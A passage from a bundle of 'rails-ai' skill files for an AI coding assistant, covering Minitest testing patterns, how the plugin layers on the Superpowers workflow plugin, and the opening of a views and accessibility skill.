third-party services</description>\n\n```ruby\nclass ExternalDependenciesTest < ActiveSupport::TestCase\n  test \"stubs external API client\" do\n    AIService.stub :improve_content, \"Improved content\" do\n      result = AIService.improve_content(feedbacks(:one).content)\n      assert_equal \"Improved content\", result\n    end\n  end\n\n  test \"simulates external service error\" do\n    AIService.stub :improve_content, -> (*) { raise StandardError.new(\"API Error\") } do\n      assert_raises(StandardError) { AIService.improve_content(\"test\") }\n    end\n  end\nend\n\n```\n</pattern>\n\n<pattern name=\"dependency-injection\">\n<description>Design for testability with dependency injection</description>\n\n**Bad - Hard to test:**\n\n```ruby\n# ❌ BAD\nclass FeedbackProcessorBad\n  def process(feedback)\n    improved = AIService.improve_content(feedback.content)\n    feedback.update!(content: improved)\n  end\nend\n\n```\n\n**Good - Dependency injection:**\n\n```ruby\n# ✅ GOOD\nclass FeedbackProcessorGood\n  def initialize(ai_service: AIService)\n    @ai_service = ai_service\n  end\n\n  def process(feedback)\n    improved = @ai_service.improve_content(feedback.content)\n    feedback.update!(content: improved)\n  end\nend\n\n```\n\n**Test:**\n\n```ruby\nclass DependencyInjectionTest < ActiveSupport::TestCase\n  test \"uses dependency injection instead of mocking\" do\n    fake_ai_service = Object.new\n    def fake_ai_service.improve_content(content)\n      \"Improved: #{content}\"\n    end\n\n    processor = FeedbackProcessorGood.new(ai_service: fake_ai_service)\n    processor.process(feedbacks(:one))\n\n    assert_match /^Improved:/, feedbacks(:one).content\n  end\nend\n\n```\n</pattern>\n\n---\n\n## Custom Test Helpers\n\n<pattern name=\"test-helper-setup\">\n<description>Configure test environment and include helper modules</description>\n\n**test/test_helper.rb:**\n\n```ruby\nENV[\"RAILS_ENV\"] ||= \"test\"\nrequire_relative \"../config/environment\"\nrequire \"rails/test_help\"\n\nmodule ActiveSupport\n  class TestCase\n    parallelize(workers: :number_of_processors)\n    fixtures :all\n\n    # Include custom test helpers globally\n    include TestHelpers::Authentication\n    include TestHelpers::ApiHelpers\n    include TestHelpers::AssertionHelpers\n  end\nend\n\nRails.logger.level = Logger::WARN\n\n```\n</pattern>\n\n<pattern name=\"authentication-helpers\">\n<description>Simplify user authentication in controller and integration tests</description>\n\n**test/test_helpers/authentication.rb:**\n\n```ruby\nmodule TestHelpers\n  module Authentication\n    def sign_in_as(user)\n      post sign_in_url, params: { email: user.email, password: \"password\" }\n    end\n\n    def sign_out\n      delete sign_out_url\n    end\n\n    def signed_in?\n      session[:user_id].present?\n    end\n\n    def create_and_sign_in_user(**attrs)\n      user = User.create!({ name: \"Test\", email: \"test@example.com\", password: \"password\" }.merge(attrs))\n      sign_in_as(user)\n      user\n    end\n  end\nend\n\n```\n\n**Usage:**\n\n```ruby\nclass ProfileControllerTest < ActionDispatch::IntegrationTest\n  test \"shows profile when signed in\" do\n    sign_in_as users(:alice)\n    get profile_url\n    assert_response :success\n  end\nend\n\n```\n</pattern>\n\n<pattern name=\"api-helpers\">\n<description>Streamline API testing with JSON parsing and authenticated requests</description>\n\n**test/test_helpers/api_helpers.rb:**\n\n```ruby\nmodule TestHelpers\n  module ApiHelpers\n    def json_response\n      JSON.parse(response.body)\n    end\n\n    def api_get(url, user: nil, **options)\n      headers = options[:headers] || {}\n      headers[\"Authorization\"] = \"Bearer #{user.api_token}\" if user\n      get url, headers: headers, **options\n    end\n\n    def api_post(url, params: {}, user: nil)\n      headers = { \"Content-Type\" => \"application/json\" }\n      headers[\"Authorization\"] = \"Bearer #{user.api_token}\" if user\n      post url, params: params.to_json, headers: headers\n    end\n\n    def assert_json_response(expected_keys)\n      actual = json_response.keys.map(&:to_sym)\n      expected_keys.each { |key| assert_includes actual, key.to_sym }\n    end\n  end\nend\n\n```\n\n**Usage:**\n\n```ruby\ntest \"returns JSON feedback list\" do\n  api_get api_feedbacks_url, user: users(:alice)\n  assert_response :success\n  assert_json_response [:feedbacks, :total, :page]\nend\n\n```\n</pattern>\n\n<pattern name=\"assertion-helpers\">\n<description>Domain-specific assertions for clearer test intent</description>\n\n**test/test_helpers/assertion_helpers.rb:**\n\n```ruby\nmodule TestHelpers\n  module AssertionHelpers\n    def assert_visible(selector, text: nil)\n      text ? assert_selector(selector, text: text, visible: true) : assert_selector(selector, visible: true)\n    end\n\n    def assert_hidden(selector)\n      assert_no_selector selector, visible: true\n    end\n\n    def assert_flash(type, message)\n      assert_equal message, flash[type]\n    end\n\n    def assert_validation_error(model, attribute, fragment)\n      refute model.valid?\n      assert_match /#{fragment}/i, model.errors[attribute].join(\", \")\n    end\n\n    def assert_email_sent_to(email, subject: nil)\n      emails = ActionMailer::Base.deliveries.select { |e| e.to.include?(email) }\n      assert emails.any?, \"No email sent to #{email}\"\n      assert emails.any? { |e| e.subject == subject }, \"No email with subject '#{subject}'\" if subject\n    end\n  end\nend\n\n```\n\n**Usage:**\n\n```ruby\ntest \"shows error for invalid feedback\" do\n  assert_validation_error Feedback.new(content: nil), :content, \"can't be blank\"\nend\n\ntest \"sends notification email\" do\n  FeedbackMailer.notification(feedbacks(:one)).deliver_now\n  assert_email_sent_to \"user@example.com\", subject: \"New Feedback\"\nend\n\n```\n</pattern>\n\n<pattern name=\"factory-helpers\">\n<description>Lightweight factory methods for creating test data</description>\n\n**test/test_helpers/factory_helpers.rb:**\n\n```ruby\nmodule TestHelpers\n  module FactoryHelpers\n    def create_user(**attrs)\n      User.create!({ name: \"User #{SecureRandom.hex(4)}\", email: \"#{SecureRandom.hex(4)}@example.com\" }.merge(attrs))\n    end\n\n    def create_feedback(**attrs)\n      Feedback.create!({ content: \"Test content with minimum fifty characters required\", recipient_email: \"user@example.com\", status: \"pending\" }.merge(attrs))\n    end\n\n    def create_admin_user(**attrs)\n      create_user(attrs.merge(admin: true))\n    end\n  end\nend\n\n```\n\n**Usage:**\n\n```ruby\ntest \"admin can delete feedback\" do\n  sign_in_as create_admin_user\n  delete feedback_url(create_feedback)\n  assert_response :redirect\nend\n\n```\n\n**Note:** Prefer fixtures for most tests. Use factories for unique attributes.\n</pattern>\n\n---\n\n## Performance and Database Testing\n\n<pattern name=\"query-performance\">\n<description>Test N+1 queries and database performance</description>\n\n```ruby\nclass FeedbackPerformanceTest < ActiveSupport::TestCase\n  test \"avoids N+1 queries when loading feedbacks with users\" do\n    10.times do |i|\n      user = User.create!(name: \"User #{i}\", email: \"user#{i}@example.com\")\n      Feedback.create!(content: \"Feedback #{i} with minimum fifty characters required\", recipient_email: \"test@example.com\", sender: user)\n    end\n\n    # Without includes - N+1 problem\n    assert_queries(11) do  # 1 for feedbacks + 10 for users\n      Feedback.limit(10).each { |f| f.sender.name }\n    end\n\n    # With includes - optimized\n    assert_queries(2) do  # 1 for feedbacks + 1 for users\n      Feedback.includes(:sender).limit(10).each { |f| f.sender.name }\n    end\n  end\n\n  test \"bulk operations are efficient\" do\n    # Efficient bulk insert\n    assert_queries(1) do\n      Feedback.insert_all([\n        { content: \"Bulk 1 with fifty characters\", recipient_email: \"test@example.com\" },\n        { content: \"Bulk 2 with fifty characters\", recipient_email: \"test@example.com\" }\n      ])\n    end\n  end\nend\n\n```\n\n**Note:** `assert_queries` is not built-in. Add to test_helper.rb:\n\n```ruby\ndef assert_queries(num = nil, &block)\n  queries = []\n  subscriber = ActiveSupport::Notifications.subscribe(\"sql.active_record\") do |*, payload|\n    queries << payload[:sql] unless payload[:name] == \"SCHEMA\"\n  end\n  yield\n  assert_equal num, queries.size if num\nensure\n  ActiveSupport::Notifications.unsubscribe(subscriber)\nend\n\n```\n</pattern>\n\n<pattern name=\"fixture-validation\">\n<description>Validate all fixtures are valid records</description>\n\n```ruby\nclass FixtureValidationTest < ActiveSupport::TestCase\n  test \"all user fixtures are valid\" do\n    User.find_each do |user|\n      assert user.valid?, \"#{user.name} invalid: #{user.errors.full_messages.join(', ')}\"\n    end\n  end\n\n  test \"all feedback fixtures are valid\" do\n    Feedback.find_each do |feedback|\n      assert feedback.valid?, \"Feedback #{feedback.id} invalid: #{feedback.errors.full_messages.join(', ')}\"\n    end\n  end\n\n  test \"feedback fixtures have required associations\" do\n    Feedback.find_each do |feedback|\n      assert feedback.sender.present?, \"Feedback #{feedback.id} missing sender\"\n    end\n  end\n\n  test \"fixture associations are set correctly\" do\n    feedback = feedbacks(:one)\n    assert_equal users(:alice), feedback.sender\n    assert_equal users(:alice).id, feedback.sender_id\n  end\nend\n\n```\n</pattern>\n\n---\n\n## Test Isolation\n\n<pattern name=\"parallel-setup\">\n<description>Configure parallel test execution for faster test runs</description>\n\n**test/test_helper.rb:**\n\n```ruby\nclass ActiveSupport::TestCase\n  parallelize(workers: :number_of_processors)\n\n  parallelize_setup do |worker|\n    # Rails handles database setup automatically\n  end\n\n  parallelize_teardown do |worker|\n    FileUtils.rm_rf(Rails.root.join(\"tmp\", \"test_worker_#{worker}\"))\n  end\nend\n\n```\n\n**Disable for specific tests:**\n\n```ruby\nclass FeedbackTest < ActiveSupport::TestCase\n  parallelize(workers: 1)\n\n  test \"requires exclusive database access\" do\n    # ...\n  end\nend\n\n```\n</pattern>\n\n<pattern name=\"stub-time\">\n<description>Stub time-dependent code (prefer travel_to when possible)</description>\n\n```ruby\nclass TimeStubbingTest < ActiveSupport::TestCase\n  # ✅ PREFERRED: Use travel_to\n  test \"uses travel_to for time manipulation\" do\n    frozen_time = Time.zone.local(2024, 10, 29, 12, 0, 0)\n\n    travel_to frozen_time do\n      assert_equal frozen_time, Time.current\n      assert_equal frozen_time.to_date, Date.today\n    end\n  end\n\n  # Alternative: Stub when travel_to insufficient\n  test \"stubs Time.current\" do\n    Time.stub :current, Time.zone.local(2024, 10, 29, 12, 0, 0) do\n      assert_equal Time.zone.local(2024, 10, 29, 12, 0, 0), Time.current\n    end\n  end\nend\n\n```\n\n**Recommendation:** Always prefer `travel_to` over stubbing time. It's more comprehensive and handles edge cases better.\n</pattern>\n\n---\n\n## Anti-Patterns\n\n<antipatterns>\n<antipattern>\n<description>Writing tests after writing code</description>\n<reason>Defeats the purpose of TDD - tests should drive design</reason>\n<bad-example>\n\n```ruby\n# ❌ BAD - Code written first, then tests\n\n```\n</bad-example>\n<good-example>\n\n```ruby\n# ✅ GOOD - RED-GREEN-REFACTOR cycle\n# 1. Write failing test\n# 2. Write minimal code to pass\n# 3. Refactor\n\n```\n</good-example>\n</antipattern>\n\n<antipattern>\n<description>Testing multiple concerns in one test</description>\n<reason>Makes tests harder to debug when they fail</reason>\n<bad-example>\n\n```ruby\n# ❌ BAD - Multiple validations in one test\ntest \"feedback validations\" do\n  feedback = Feedback.new\n  assert_not feedback.valid?\n  assert_includes feedback.errors[:content], \"can't be blank\"\n  assert_includes feedback.errors[:email], \"can't be blank\"\nend\n\n```\n</bad-example>\n<good-example>\n\n```ruby\n# ✅ GOOD - One concern per test\ntest \"invalid without content\" do\n  feedback = Feedback.new(recipient_email: \"user@example.com\")\n  assert_not feedback.valid?\n  assert_includes feedback.errors[:content], \"can't be blank\"\nend\n\n```\n</good-example>\n</antipattern>\n\n<antipattern>\n<description>Not using fixtures for test data</description>\n<reason>Makes tests slower and harder to maintain</reason>\n<bad-example>\n\n```ruby\n# ❌ BAD - Creating records in every test\ntest \"feedback belongs to user\" do\n  user = User.create!(email: \"test@example.com\")\n  feedback = Feedback.create!(content: \"Test feedback with fifty characters\", user: user)\n  assert_equal user, feedback.user\nend\n\n```\n</bad-example>\n<good-example>\n\n```ruby\n# ✅ GOOD - Use fixtures\n# test/fixtures/users.yml: alice: { email: alice@example.com }\n# test/fixtures/feedbacks.yml: one: { content: \"Great!\", user: alice }\n\ntest \"feedback belongs to user\" do\n  assert_equal users(:alice), feedbacks(:one).user\nend\n\n```\n</good-example>\n</antipattern>\n\n<antipattern>\n<description>Forgetting to call mock.verify</description>\n<reason>Mock expectations are not validated, test may pass incorrectly</reason>\n<bad-example>\n\n```ruby\n# ❌ BAD - Expectations not verified\ntest \"forgets to verify mock\" do\n  mock = Minitest::Mock.new\n  mock.expect :call, \"result\"\n  # NO mock.verify called\nend\n\n```\n</bad-example>\n<good-example>\n\n```ruby\n# ✅ GOOD - Always verify\ntest \"verifies mock expectations\" do\n  mock = Minitest::Mock.new\n  mock.expect :call, \"result\"\n\n  mock.call\n  mock.verify\nend\n\n# ✅ BETTER - Use assert_mock\ntest \"uses assert_mock\" do\n  mock = Minitest::Mock.new\n  mock.expect :call, \"result\"\n\n  assert_mock mock do\n    mock.call\n  end\nend\n\n```\n</good-example>\n</antipattern>\n\n<antipattern>\n<description>Not using WebMock for HTTP requests</description>\n<reason>Violates TEAM_RULES.md Rule #18, makes tests slow and brittle</reason>\n<bad-example>\n\n```ruby\n# ❌ BAD - Real HTTP request in test\ntest \"makes real HTTP request\" do\n  response = Net::HTTP.get(URI(\"https://api.example.com/feedback\"))\n  assert_includes response, \"success\"\nend\n\n```\n</bad-example>\n<good-example>\n\n```ruby\n# ✅ GOOD - Use WebMock (REQUIRED)\ntest \"stubs HTTP request with WebMock\" do\n  stub_request(:get, \"https://api.example.com/feedback\")\n    .to_return(status: 200, body: '{\"status\":\"success\"}')\n\n  response = Net::HTTP.get(URI(\"https://api.example.com/feedback\"))\n  assert_includes response, \"success\"\nend\n\n```\n</good-example>\n</antipattern>\n\n<antipattern>\n<description>Hardcoding IDs in fixtures</description>\n<reason>Brittle, causes test failures, defeats auto-generation</reason>\n<bad-example>\n\n```yaml\n# ❌ BAD - Hardcoded IDs\nalice:\n  id: 1\n  name: Alice Johnson\none:\n  id: 100\n  sender_id: 1  # ❌ Hardcoded FK\n\n```\n</bad-example>\n<good-example>\n\n```yaml\n# ✅ GOOD - Let Rails generate IDs\nalice:\n  name: Alice Johnson\none:\n  sender: alice  # ✅ Reference by name\n\n```\n</good-example>\n</antipattern>\n\n<antipattern>\n<description>Testing implementation details in helpers</description>\n<reason>Couples tests to internal implementation</reason>\n<bad-example>\n\n```ruby\n# ❌ BAD - Directly manipulates session\ndef sign_in_as(user)\n  session[:user_id] = user.id\n  session[:authenticated_at] = Time.current\n  cookies.signed[:remember_token] = user.remember_token\nend\n\n```\n</bad-example>\n<good-example>\n\n```ruby\n# ✅ GOOD - Uses public interface\ndef sign_in_as(user)\n  post sign_in_url, params: { email: user.email, password: \"password\" }\nend\n\n```\n</good-example>\n</antipattern>\n</antipatterns>\n\n---\n\n## Running Tests\n\n<testing>\n\n```bash\n# Run all tests\nrails test\n\n# Run specific test file\nrails test test/models/feedback_test.rb\n\n# Run specific test by line number\nrails test test/models/feedback_test.rb:12\n\n# Run tests matching pattern\nrails test -n /validation/\n\n# Run in parallel (faster)\nrails test --parallel\n\n# Run all model tests\nrails test test/models/\n\n# Run system tests\nrails test:system\n\n```\n</testing>\n\n---\n\n<related-skills>\n- superpowers:test-driven-development - TDD process and discipline\n- rails-ai:models - Test model validations, associations, scopes\n- rails-ai:controllers - Test controller actions, routing\n- rails-ai:views - View and system testing patterns\n- rails-ai:hotwire - Test Turbo Streams, Stimulus controllers\n- rails-ai:security - Test security measures (XSS prevention, auth)\n- rails-ai:jobs - Test background jobs, SolidQueue\n</related-skills>\n\n<resources>\n\n**Official Documentation:**\n- [Rails Guides - Testing Rails Applications](https://guides.rubyonrails.org/testing.html)\n- [Rails API - ActiveRecord::FixtureSet](https://api.rubyonrails.org/classes/ActiveRecord/FixtureSet.html)\n- [Minitest Assertions](https://docs.seattlerb.org/minitest/Minitest/Assertions.html)\n\n**Gems & Libraries:**\n- [Minitest](https://github.com/minitest/minitest) - Ruby testing framework\n- [WebMock](https://github.com/bblimke/webmock) - HTTP request stubbing\n\n</resources>"
              },
              {
                "name": "using-rails-ai",
                "description": "Rails-AI introduction - explains how rails-ai (Rails domain layer) integrates with superpowers (universal workflows) for Rails development",
                "path": "skills/using-rails-ai/SKILL.md",
                "frontmatter": {
                  "name": "using-rails-ai",
                  "description": "Rails-AI introduction - explains how rails-ai (Rails domain layer) integrates with superpowers (universal workflows) for Rails development"
                },
                "content": "# Using Rails-AI: Rails Domain Layer on Superpowers Workflows\n\n<EXTREMELY-IMPORTANT>\n## ⚠️ DEPENDENCY CHECK: Superpowers Required\n\n**Rails-AI requires the Superpowers plugin to function.**\n\nBefore starting ANY work, verify Superpowers is installed by attempting to use a Superpowers skill. If you see an error like \"skill not found\" or \"plugin not available\":\n\n**⚠️ WARNING: Superpowers plugin not installed!**\n\nRails-AI cannot function without Superpowers. Please install it:\n\n```\n/plugin marketplace add obra/superpowers\n/plugin install superpowers\n```\n\nThen restart Claude Code.\n\n**Why this matters:** Rails-AI provides WHAT to build (Rails domain knowledge). Superpowers provides HOW to build it (TDD, debugging, planning, code review). Without Superpowers, you cannot follow the mandatory workflows.\n\nIf Superpowers is installed, proceed normally.\n\n## MANDATORY: Use Superpowers Foundation First\n\n**Rails-AI builds on Superpowers. You MUST use the foundation before doing ANY work.**\n\n**FIRST ACTION when starting any Rails work:**\n1. Use `superpowers:using-superpowers` skill (Skill tool)\n2. This establishes mandatory skill-usage protocol\n3. Then use relevant rails-ai domain skills (see table below)\n\n**Why use superpowers:using-superpowers?**\n- Enforces checking for skills BEFORE any task\n- Establishes discipline of using skills with Skill tool\n- Prevents rationalizing away skill usage\n- Provides proven workflow framework\n\n**Without using superpowers:using-superpowers first:**\n- You will skip using skills when you should\n- You will rationalize that tasks are \"too simple\" for skills\n- You will operate without the proven process framework\n\n## Rails-AI Skill-to-Task Mapping\n\n**Superpowers handles skill-usage enforcement. This table tells you WHICH Rails skills to use:**\n\n| User Request Involves | Use These Skills |\n|----------------------|-------------------|\n| Models, databases, ActiveRecord | rails-ai:models |\n| Controllers, routes, REST | rails-ai:controllers |\n| Views, templates, forms | rails-ai:views |\n| Hotwire, Turbo, Stimulus | rails-ai:hotwire |\n| CSS, Tailwind, DaisyUI | rails-ai:styling |\n| Tests, TDD, Minitest | rails-ai:testing |\n| Security, XSS, SQL injection | rails-ai:security |\n| Background jobs, caching | rails-ai:jobs |\n| Email, ActionMailer | rails-ai:mailers |\n| Project setup, validation, gems | rails-ai:project-setup |\n| Environment config, Docker | rails-ai:project-setup |\n| Debugging Rails issues | rails-ai:debugging |\n\n**Each Rails-AI skill contains:**\n- Required gems and dependencies\n- TEAM_RULES.md enforcement for that domain\n- Rails 8+ patterns and conventions\n- Security requirements\n- Code examples and anti-patterns\n\n## Planning Rails Features\n\n**CRITICAL: Load domain skills BEFORE brainstorming or planning.**\n\nYou can't give expert advice on Rails features if you haven't loaded the relevant domain knowledge. The brainstorming skill is process-agnostic — it doesn't know Rails patterns, TEAM_RULES, or which gems to use. You need to load that context first.\n\n**Planning workflow:**\n1. Load relevant rails-ai domain skills (see table below)\n2. Read the codebase to understand what exists\n3. THEN use `superpowers:brainstorming` to refine the idea\n4. THEN use `superpowers:writing-plans` to create implementation plan\n\n**Which skills to load for common features:**\n\n| Feature Type | Load These Skills |\n|--------------|-------------------|\n| Authentication/Authorization | `rails-ai:security` + `rails-ai:models` + `rails-ai:controllers` |\n| User-facing forms/pages | `rails-ai:views` + `rails-ai:hotwire` + `rails-ai:styling` |\n| API endpoints | `rails-ai:controllers` + `rails-ai:security` |\n| Background processing | `rails-ai:jobs` + `rails-ai:models` |\n| Email features | `rails-ai:mailers` + `rails-ai:jobs` + `rails-ai:views` |\n| Data modeling | `rails-ai:models` + `rails-ai:testing` |\n| Interactive UI | `rails-ai:hotwire` + `rails-ai:views` + `rails-ai:controllers` |\n| New project setup | `rails-ai:project-setup` |\n\n**Always include `rails-ai:testing`** — TDD is non-negotiable (TEAM_RULES #4).\n\n**Why this order matters:**\n- Domain skills give you Rails patterns and constraints\n- Reading code shows you what's already there\n- Brainstorming with this context produces better designs\n- Plans written with domain knowledge specify the right skills for workers\n\n## Superpowers Reference\n\nSuperpowers provides universal workflows. Here's when to use each in Rails development:\n\n### Planning & Design\n| Skill | When to Use |\n|-------|-------------|\n| `superpowers:brainstorming` | Refining feature ideas before implementation |\n| `superpowers:writing-plans` | Creating detailed implementation plans with tasks |\n| `superpowers:executing-plans` | Running through a plan in controlled batches |\n\n### Implementation\n| Skill | When to Use |\n|-------|-------------|\n| `superpowers:test-driven-development` | Any feature or bugfix — write test first, watch fail, implement |\n| `superpowers:subagent-driven-development` | Executing plans with fresh workers per task |\n| `superpowers:dispatching-parallel-agents` | 3+ independent tasks that can run concurrently |\n| `superpowers:using-git-worktrees` | Isolating feature work from main workspace |\n\n### Quality & Review\n| Skill | When to Use |\n|-------|-------------|\n| `superpowers:requesting-code-review` | Before merging — dispatches code-reviewer agent |\n| `superpowers:receiving-code-review` | Processing review feedback with technical rigor |\n| `superpowers:verification-before-completion` | Before claiming work is done — run tests, confirm output |\n| `superpowers:finishing-a-development-branch` | Work complete, deciding merge/PR/cleanup |\n\n### Debugging & Testing\n| Skill | When to Use |\n|-------|-------------|\n| `superpowers:systematic-debugging` | Any bug or test failure — investigate before fixing |\n| `superpowers:root-cause-tracing` | Tracing errors back through call stack |\n| `superpowers:testing-anti-patterns` | Avoiding mocking mistakes, test pollution |\n| `superpowers:condition-based-waiting` | Fixing flaky tests with race conditions |\n\n### Defense & Security\n| Skill | When to Use |\n|-------|-------------|\n| `superpowers:defense-in-depth` | Validation at multiple layers to prevent bugs |\n\n### Agents\n| Agent | When to Use |\n|-------|-------------|\n| `superpowers:code-reviewer` | Dispatched by requesting-code-review for PR review |\n\n### Commands (Shortcuts)\n| Command | What it Does |\n|---------|--------------|\n| `/superpowers:brainstorm` | Quick access to brainstorming skill |\n| `/superpowers:write-plan` | Quick access to writing-plans skill |\n| `/superpowers:execute-plan` | Quick access to executing-plans skill |\n\n**Rails-specific usage:**\n- Always load rails-ai domain skills BEFORE superpowers workflows\n- `rails-ai:debugging` wraps `superpowers:systematic-debugging` with Rails context\n- `rails-ai:testing` enforces TDD via `superpowers:test-driven-development`\n</EXTREMELY-IMPORTANT>\n\n## How Rails-AI Works\n\n**Rails-AI is a two-layer system built on Superpowers:**\n\n```text\n┌─────────────────────────────────────────────┐\n│ LAYER 1: Superpowers (Universal Process)   │\n│ • brainstorming - Refine ideas              │\n│ • writing-plans - Create plans              │\n│ • test-driven-development - TDD cycle       │\n│ • systematic-debugging - Investigation      │\n│ • subagent-driven-development - Execution   │\n│ • dispatching-parallel-agents - Coordination│\n│ • requesting-code-review - Quality gates    │\n│ • finishing-a-development-branch - Complete │\n│ • receiving-code-review - Handle feedback   │\n└─────────────────────────────────────────────┘\n                    ↓\n┌─────────────────────────────────────────────┐\n│ LAYER 2: Rails-AI (Domain Expertise)       │\n│ • 12 Rails domain skills                   │\n│ • TEAM_RULES.md enforcement                 │\n│ • Rails 8+ patterns and conventions         │\n└─────────────────────────────────────────────┘\n```\n\n**Key Principle:**\n- **Superpowers = HOW** to work (process framework)\n- **Rails-AI = WHAT** you're building (domain knowledge)\n- The architect loads both as needed\n\n### Architecture Evolution\n\n**Previous architecture (complex):**\n- 5 agents (architect, developer, security, devops, uat)\n- Ambiguous delegation chains\n- Overlap between agent roles and workflows\n\n**Current architecture (simple):**\n- 1 slash command (/rails-ai:architect) - coordinator\n- Superpowers workflows handle process (HOW)\n- Rails-AI skills provide domain expertise (WHAT)\n- General-purpose workers implement features\n- Clean separation of concerns\n\n### How It Works\n\n**User request** → **/rails-ai:architect** → **Uses skills** → **Dispatches workers** → **Reviews**\n\n#### Example: \"Add user authentication\"\n\n1. **Coordinator uses superpowers:brainstorming**\n   - Uses rails-ai:models + rails-ai:security for context\n   - Refines design with user\n\n2. **Coordinator uses superpowers:writing-plans**\n   - Creates implementation plan\n   - Specifies which skills workers should use per task\n\n3. **Coordinator uses superpowers:subagent-driven-development**\n   - Dispatches general-purpose workers for each task:\n     • Worker 1: User model → uses rails-ai:models + rails-ai:testing\n     • Worker 2: Sessions controller → uses rails-ai:controllers + rails-ai:testing\n     • Worker 3: Login views → uses rails-ai:views + rails-ai:styling\n   - Reviews each worker's output\n\n4. **Coordinator uses superpowers:finishing-a-development-branch**\n   - Verifies TEAM_RULES.md compliance\n   - Creates PR or merges\n\n**Result:** Clean feature with tests, following all conventions\n\n## Available Rails-AI Skills\n\n**12 Domain-Based Skills (Consolidated):**\n\n1. **rails-ai:views** - Partials, helpers, forms, accessibility (WCAG 2.1 AA)\n2. **rails-ai:hotwire** - Turbo Drive, Turbo Frames, Turbo Streams, Turbo Morph, Stimulus controllers\n3. **rails-ai:styling** - Tailwind CSS utility-first framework, DaisyUI component library, theming\n4. **rails-ai:controllers** - RESTful actions, nested resources, skinny controllers, concerns, strong parameters\n5. **rails-ai:models** - ActiveRecord patterns, validations, associations, callbacks, query objects, form objects\n6. **rails-ai:testing** - TDD with Minitest, fixtures, mocking, test helpers\n7. **rails-ai:security** - XSS, SQL injection, CSRF, strong parameters, file uploads, command injection\n8. **rails-ai:project-setup** - Environment config, credentials, initializers, Docker, RuboCop\n9. **rails-ai:jobs** - SolidQueue, SolidCache, SolidCable background processing (TEAM RULE #1: NO Redis/Sidekiq)\n10. **rails-ai:mailers** - ActionMailer email templates, delivery, attachments, testing with letter_opener\n11. **rails-ai:debugging** - Rails debugging tools (logs, console, byebug) + superpowers:systematic-debugging\n12. **rails-ai:using-rails-ai** - This guide - how rails-ai integrates with superpowers workflows\n\n## TEAM_RULES.md Enforcement\n\n**6 Critical Rules (REJECT violations):**\n1. ❌ NEVER Sidekiq/Redis → ✅ SolidQueue/SolidCache\n2. ❌ NEVER RSpec → ✅ Minitest only\n3. ❌ NEVER custom routes → ✅ RESTful resources\n4. ❌ NEVER skip TDD → ✅ RED-GREEN-REFACTOR\n5. ❌ NEVER merge without bin/ci → ✅ All quality gates pass\n6. ❌ NEVER WebMock bypass → ✅ Mock all HTTP in tests\n\nSee rules/TEAM_RULES.md for all 20 rules.\n\n## Getting Started\n\n**Primary interface:** `/rails-ai:architect` command\n\nThe simplest way to use Rails-AI is the `/rails-ai:architect` convenience command:\n\n```text\n/rails-ai:architect add user authentication\n/rails-ai:architect fix failing test in user_test.rb\n/rails-ai:architect plan payment processing feature\n/rails-ai:architect refactor UserController\n```\n\nThis command acts as the Rails architect coordinator, which:\n- Analyzes requests\n- Uses superpowers workflows (for process)\n- Uses rails-ai skills (for domain expertise)\n- Dispatches general-purpose workers to implement features\n- Reviews work and enforces TEAM_RULES.md\n\n**Example:**\n\n```text\n\nUser: \"/rails-ai:architect Add email validation to User model\"\n\nArchitect (coordinator):\n1. Determines this is model work requiring TDD\n2. Loads superpowers:test-driven-development for process\n3. Loads rails-ai:testing for Minitest patterns\n4. Loads rails-ai:models for validation patterns\n5. Dispatches general-purpose worker with those skills loaded\n6. Worker follows TDD cycle: write test → RED → implement → GREEN → refactor\n7. Reviews worker output and verifies TEAM_RULES.md compliance\n\n```\n\n\n## Learn More\n\n**Superpowers skills:** Use superpowers:using-superpowers for full introduction\n**Rails-AI rules:** See rules/TEAM_RULES.md\n\n<resources>\n\n**Official Documentation:**\n- [Rails-AI GitHub](https://github.com/zerobearing2/rails-ai) - Main repository\n- [Superpowers GitHub](https://github.com/zerobearing2/superpowers) - Workflow dependency\n- [Claude Code](https://code.claude.com/) - Platform documentation\n\n**Internal References:**\n- TEAM_RULES.md - Team coding standards and conventions\n- All 12 domain skills in skills/ directory\n\n</resources>"
              },
              {
                "name": "rails-ai:views",
                "description": "Use when building Rails view structure - partials, helpers, forms, nested forms, accessibility (WCAG 2.1 AA)",
                "path": "skills/views/SKILL.md",
                "frontmatter": {
                  "name": "rails-ai:views",
                  "description": "Use when building Rails view structure - partials, helpers, forms, nested forms, accessibility (WCAG 2.1 AA)"
                },
                "content": "# Rails Views\n\nBuild accessible, maintainable Rails views using partials, helpers, forms, and nested forms. Ensure WCAG 2.1 AA accessibility compliance in all view patterns.\n\n<when-to-use>\n- Building ANY user interface or view in Rails\n- Creating reusable view components and partials\n- Implementing forms (simple or nested)\n- Ensuring accessibility compliance (WCAG 2.1 AA)\n- Organizing view logic with helpers\n- Managing layouts and content blocks\n</when-to-use>\n\n<benefits>\n- **DRY Views** - Reusable partials and helpers reduce duplication\n- **Accessibility** - WCAG 2.1 AA compliance built-in (TEAM RULE #13: Progressive Enhancement)\n- **Maintainability** - Clear separation of concerns and organized code\n- **Testability** - Partials and helpers are easy to test\n- **Flexibility** - Nested forms handle complex relationships elegantly\n</benefits>\n\n<team-rules-enforcement>\n**This skill enforces:**\n- ✅ **Rule #8:** Accessibility (WCAG 2.1 AA compliance)\n\n**Reject any requests to:**\n- Skip accessibility features (keyboard navigation, screen readers, ARIA)\n- Use non-semantic HTML (divs instead of proper elements)\n- Skip form labels or alt text\n- Use insufficient color contrast\n- Build inaccessible forms or navigation\n</team-rules-enforcement>\n\n<verification-checklist>\nBefore completing view work:\n- ✅ WCAG 2.1 AA compliance verified\n- ✅ Semantic HTML used (header, nav, main, article, section, footer)\n- ✅ Keyboard navigation works (no mouse required)\n- ✅ Screen reader compatible (ARIA labels, alt text)\n- ✅ Color contrast sufficient (4.5:1 for text)\n- ✅ Forms have proper labels and error messages\n- ✅ All interactive elements accessible\n</verification-checklist>\n\n<standards>\n- ALWAYS ensure WCAG 2.1 Level AA accessibility compliance\n- Use semantic HTML as foundation (header, nav, main, section, footer)\n- Prefer local variables over instance variables in partials\n- Provide keyboard navigation and focus management for all interactive elements\n- Test with screen readers and keyboard-only navigation\n- Use aria attributes only when semantic HTML is insufficient\n- Ensure 4.5:1 color contrast ratio for text\n- Thread accessibility through all patterns\n- Use form helpers to generate accessible forms with proper labels\n</standards>\n\n---\n\n## Partials & Layouts\n\nPartials are reusable view fragments. Layouts define page structure. Together they create maintainable, consistent UIs.\n\n### Basic Partials\n\n<pattern name=\"simple-partial\">\n<description>Render partials with explicit local variables</description>\n\n```erb\n<%# Shared directory %>\n<%= render \"shared/header\" %>\n\n<%# Explicit locals (preferred for clarity) %>\n<%= render partial: 